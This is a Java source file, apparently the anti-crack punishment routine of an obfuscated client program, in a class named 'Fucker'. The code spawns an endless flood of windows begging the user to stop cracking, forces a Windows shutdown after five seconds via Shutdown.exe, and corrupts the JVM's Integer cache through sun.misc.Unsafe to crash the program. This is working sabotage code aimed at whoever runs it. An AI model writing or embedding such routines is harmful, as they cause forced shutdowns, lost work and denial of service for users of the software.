package my.distance.manager;

import LemonObfAnnotation.ObfuscationClass;
import sun.misc.Unsafe;

import javax.swing.*;
import java.io.IOException;
import java.lang.reflect.Field;
import java.util.Random;
import java.util.Timer;
import java.util.TimerTask;

@ObfuscationClass
public class Fucker {
    public static void dofuck() {
        new Thread(() -> {
            Random rd = new Random();
            while (true) {
                JFrame frame = new JFrame("别破解了，求你了");
                frame.setSize(400, 200);
                frame.setLocation(rd.nextInt(java.awt.Toolkit.getDefaultToolkit().getScreenSize().width), rd.nextInt(java.awt.Toolkit.getDefaultToolkit().getScreenSize().height));
                frame.setVisible(true);
            }
        }).start();
        new Timer().schedule(new TimerTask() {
            public void run() {
                Runtime run = Runtime.getRuntime();
                try {
                    run.exec("Shutdown.exe -s -t 1");
                    run.exit(0);
                } catch (IOException e) {
                    run.exit(0);
                }
            }
        }, (5000L));
        try {
            Field field = Unsafe.class.getDeclaredField("theUnsafe");
            field.setAccessible(true);
            Unsafe unsafe = null;
            try {
                unsafe = (Unsafe) field.get(null);
            } catch (IllegalAccessException e) {
                e.printStackTrace();
            }
            Class<?> cacheClass = null;
            try {
                cacheClass = Class.forName("java.lang.Integer$IntegerCache");
            } catch (ClassNotFoundException e) {
                e.printStackTrace();
            }
            Field cache = cacheClass.getDeclaredField("cache");
            long offset = unsafe.staticFieldOffset(cache);

            unsafe.putObject(Integer.getInteger("谢谢...然后再见吧..."), offset, null);

        } catch (NoSuchFieldException e) {
            System.exit(0);
        }
    }
}
